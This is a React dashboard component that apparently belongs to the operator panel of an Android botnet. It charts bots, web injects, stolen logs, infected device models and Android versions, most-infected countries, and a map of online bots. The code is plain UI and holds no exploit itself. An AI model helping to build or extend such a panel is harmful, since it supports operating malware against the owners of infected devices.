import React, {useLayoutEffect} from "react";
import {getStatsList} from "../../../Store/Stats/Actions";
import {Button, Checkbox, Col, ColProps, DatePicker, Divider, DividerProps, Row} from "antd";
import CountersCards from "./CountersCards";
import BotsLine from "./BotsLine";
import InjectsLine from "./InjectsLine";
import {useTranslation} from "react-i18next";
import {themeAccentColor} from "../../../Util/config";
import {BarChartOutlined} from "@ant-design/icons";
import PieStats from "./LogsPie";
import {AppState} from "../../../Store/RootReducer";
import InjectsPie from "./InjectsPie";
import LeafletBotsMap from "../../Misc/LeafletBotsMap";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import DeviceModelPlot from "./DeviceModelPlot";
import AndroidVersionsPlot from "./AndroidVersionsPlot";
import MostInfectedCountriesPlot from "./MostInfectedCountriesPlot";

export const dividerConfig: DividerProps = {
    orientation: "left",
    style: {
        margin: "8px 0 0",
    },
};

export const sliderConfig = {
    start: 0,
    end: 1,
    height: 40,
    foregroundStyle: {
        fill: themeAccentColor,
        opacity: 0.3,
    },
    backgroundStyle: {
        fill: "#ffffff",
        opacity: 0.05,
    },
    handlerStyle: {
        stroke: "#396320",
        fill: themeAccentColor,
        width: 15,
        height: 40,
    },
};

const GeneralStats: React.FC = () => {
    const statsReducer = useAppSelector((state: AppState) => state.stats);

    const {t} = useTranslation();

    const dispatch = useAppDispatch();

    useLayoutEffect(() => {
        dispatch(getStatsList());
    }, [dispatch]);

    const timeLinesColConfig: ColProps = {
        xxl: 12,
        xl: 12,
        md: 12,
        sm: 24,
        xs: 24,
        style: {
            marginBottom: 15,
        },
    };

    const piesColConfig: ColProps = {
        xxl: 12,
        xl: 12,
        md: 24,
        sm: 24,
        xs: 24,
        style: {
            marginBottom: 15,
        },
    };

    return (
        <>
            <br/>

            <CountersCards />

            <div className="panel-content">
                <div className="stat-group">
                    <Row gutter={15}>
                        <Col span={24}>
                            <div className="stat-group-filter">
                                <Divider {...dividerConfig} orientation="center">
                                    <h2>{t("SELECT_TIME_RANGE")}</h2>
                                </Divider>

                                <div className="stat-group-filter-inner">
                                    <DatePicker.RangePicker />

                                    <Button
                                        type="primary"
                                        icon={<BarChartOutlined />}
                                    >
                                        {t("APPLY")}
                                    </Button>
                                </div>

                                <Checkbox
                                    onChange={(e) => console.log(e)}
                                    style={{marginTop: 15}}
                                >
                                    {t("SHOW_FOR_ALL_TIME")}
                                </Checkbox>
                            </div>
                        </Col>
                        <Col {...timeLinesColConfig}>
                            <BotsLine data={statsReducer.bots.timelines} loading={!statsReducer.isLoaded} title={t("SIDEBAR_NAV_BOTS")} />
                        </Col>
                        <Col {...timeLinesColConfig}>
                            <InjectsLine data={statsReducer.injects.timelines} loading={!statsReducer.isLoaded} title={t("SIDEBAR_NAV_INJECTIONS")} />
                        </Col>

                        <Col {...timeLinesColConfig}>
                            <DeviceModelPlot data={statsReducer.bots.models} loading={!statsReducer.isLoaded} title={t("DEVICE_MODELS_STATS")} />
                        </Col>

                        <Col {...timeLinesColConfig}>
                            <AndroidVersionsPlot data={statsReducer.bots.androids} loading={!statsReducer.isLoaded} title={t("ANDROID_VERSIONS_STATS")} />
                        </Col>
                    </Row>
                </div>
                <div className="stat-group">
                    <Divider>
                        <h2>{t("SUMMARY_BOTS_INJECTS_STATS")}</h2>
                    </Divider>
                    <Row gutter={15}>
                        <Col {...piesColConfig}>
                            <PieStats
                                logs={statsReducer.logs.counts}
                                title={t("STATS_LOGS")}
                            />
                        </Col>
                        <Col {...piesColConfig}>
                            <InjectsPie
                                injects={statsReducer.injects.counts}
                                title={t("STATS_INJECTS")}
                            />
                        </Col>
                    </Row>
                </div>

                <div className="stat-group">
                    <Row gutter={15}>
                        <Col span={24}>
                            <Divider {...dividerConfig} orientation="center">
                                <h2>{t("STATS_ONLINE_MAP")}</h2>
                            </Divider>

                            <br/>

                            {/* TODO */}
                            <LeafletBotsMap data={statsReducer.bots.map} />
                        </Col>
                    </Row>
                </div>

                <div className="stat-group">
                    <Row gutter={15}>
                        <Col span={24}>
                            <Divider {...dividerConfig} orientation="center">
                                <h2>{t("MOST_INFECTED_COUNTRIES")}</h2>
                            </Divider>

                            <MostInfectedCountriesPlot data={statsReducer.bots.countries}
                                loading={!statsReducer.isLoaded} title={t("MOST_INFECTED_COUNTRIES")} />
                        </Col>
                    </Row>
                </div>
            </div>
        </>
    );
};

export default GeneralStats;
